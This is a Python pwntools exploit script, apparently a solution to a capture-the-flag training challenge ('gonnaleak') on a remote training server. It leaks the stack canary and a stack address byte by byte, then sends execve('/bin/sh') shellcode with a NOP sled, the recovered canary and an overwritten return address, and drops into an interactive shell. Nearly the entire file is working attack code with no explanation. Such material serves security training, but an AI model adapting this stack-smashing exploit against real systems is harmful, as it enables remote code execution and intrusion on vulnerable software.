import pwn

pwn.context.terminal = ['gnome-terminal', '-e']
pwn.context.arch = 'amd64'

r = pwn.remote('training.jinblack.it', 2011)

# r = pwn.process('./gonnaleak')

# breakpoint_addr = 'b *0x401224'

# pwn.gdb.attach(r, """
#     b *0x401224
#     c

# """)

input('wait')

shell_code = pwn.asm('''
    jmp end
    start:
    pop rdi
    mov rax, 0x3b
    lea rsi, [rdi + 0x7]
    mov rdx, rsi
    syscall
    end:
    call start
''') + b'/bin/sh' + b'\x00' * 8

buffer_len = 104

filler_until_canary = b'A' * (buffer_len + 1)

r.send(filler_until_canary)

r.recvuntil(b'> ')

r.recv(len(filler_until_canary))

canary = b'\x00' + r.recv(7)

r.clean() # flush stdout

print('canary')
print(pwn.binascii.hexlify(canary))

# print(pwn.binascii.hexlify(saved_ebp))

# print(len(saved_ebp))

leak = b''

ADDRESS_SIZE = 8
 
buffer_base_to_leak = 0x88 # amount of characters until start of leak

offset_from_leak = 0x158 - 0x10 # offset from base buffer address to the leaked address

while len(leak) < ADDRESS_SIZE:
    filler_until_leak_zero = b'A' * (buffer_base_to_leak + len(leak))
    r.send(filler_until_leak_zero)
    r.recvuntil(b'> ')
    r.recv(len(filler_until_leak_zero))
    missing_bytes = r.recv(ADDRESS_SIZE - len(leak), timeout=0.01)
    if len(missing_bytes) != 0:
        leak += missing_bytes
    else:
        leak += b'\x00'
    print(pwn.binascii.hexlify(leak))
    print(len(leak))


print('final leak:')
print(pwn.binascii.hexlify(leak))
print(len(leak))

buffer_addr = pwn.u64(leak) - offset_from_leak

print('sending exploit')

r.send((shell_code).rjust(buffer_len, b'\x90') + canary + b'\x90' * 8 + pwn.p64(buffer_addr))

r.interactive()